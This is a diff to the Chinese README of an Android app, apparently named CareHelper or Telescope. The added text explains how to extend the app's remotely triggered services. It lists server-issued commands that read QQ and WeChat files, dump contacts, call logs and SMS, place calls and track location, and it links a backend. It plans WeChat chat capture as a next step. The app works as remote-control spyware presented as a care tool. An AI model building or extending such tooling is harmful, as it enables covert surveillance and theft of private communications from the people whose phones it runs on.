@@ -38,6 +38,117 @@ public class Constant {
 
 ### 2 扩展能力
 
-// todo
+本APP提供完备的可扩展支持，接下来我将描述如何扩展一个新能力。
 
-### 3 欢迎提建议
+在service目录下新建一个TargetService并继承自Service，实现doCommand方法。
+
+```java
+public class TargetService implements Service {
+  
+  	public void doTarget() {}
+    @Override
+    public CommandResponse doCommand(String type) {
+        // Target相关业务逻辑
+        this.doTarget();
+        return null;
+    }
+}
+```
+
+如果需要依赖注入，在CareHelperService的基类的BaseService中添加注入（这里本来想抄Spring的依赖注入的，但是作者有一点懒，所以就写了一个简陋版的依赖注入）
+
+```java
+        this.container
+                .addService("PhoneService", new PhoneService(context))
+                .addService("FileService", new FileService(context, activity))
+                .addService("AppService", new AppService(context))
+                .addService("LocationService", new LocationService(context))
+                .addService("TargetService", new TargetService());
+```
+
+当完成注入之后，可以在CareHelperService中实现能力调用。就像下面这样。
+
+```java
+    public CareHelperService(Context context, FragmentActivity activity) {
+        super(context, activity);
+        try {
+            this.activity = activity;
+            this.commandService = new CommandService();
+            this.targetService = ((TargetService) this.container.getService("TargetService"));
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+```
+
+最后在MessageHandler那里处理指令即可。
+
+```java
+            if ((Integer) jsonObject.get("code") == 200) {
+                switch ((Integer) jsonObject.get("type")) {
+                    case 0:
+           							// todo
+                        break;
+                    case 1:
+                        // todo
+                        break;
+                    case 2:
+                    		// 主要解析命令的地方，我们实现后的也是从这里解析走的
+                        JSONObject commands = (JSONObject) jsonObject.get("data");
+                        if (commands != null && !commands.isEmpty()) {
+                            List<Object> cmds = new ArrayList<>(commands.values());
+                            commandService.parseCommandsAndExec(cmds);
+                        }
+                    default:
+                        Log.i("", "");
+                }
+            }
+            // 位于commandService中
+            public void parseCommandAndExec(String command) {
+                Log.i("command", "doCommand: " + command);
+                String type = command.split(":")[0];
+                switch (type) {
+                    case CommandType.FILE:
+                        this.fileService.doCommand(command);
+                        break;
+                    case CommandType.LOCATION:
+                        this.locationService.doCommand(command);
+                        break;
+                    case CommandType.PHONE:
+                        this.phoneService.doCommand(command);
+                        break;
+                    default:
+                        Log.e("CommandService", "type error!");
+                        break;
+                }
+            }
+```
+
+### 3 触发指令
+
+```
+// 文件读取指令
+file:qq  // 读取qq文件列表
+file:we   // 读取微信文件列表
+// 手机能力
+phone:setMaxVolum // 手机音量调到最大
+phone:ContactList // 获取联系人记录
+phone:callPhone:手机号码 // 拨打电话
+phone:PhoneRecords     // 获取通话记录
+phone:PhoneMessageList //  获取电话信息
+// 定位
+location:update // 开启位置更新
+location:cancel // 取消位置更新
+```
+
+### 4 部署后台服务
+
+TelescopeWeb: https://github.com/telescope-org/telescope-web
+
+### 5 To do list
+
+- 抓取微信聊天记录
+
+### 6 欢迎提建议
+
+github issues即可，会定期维护更新
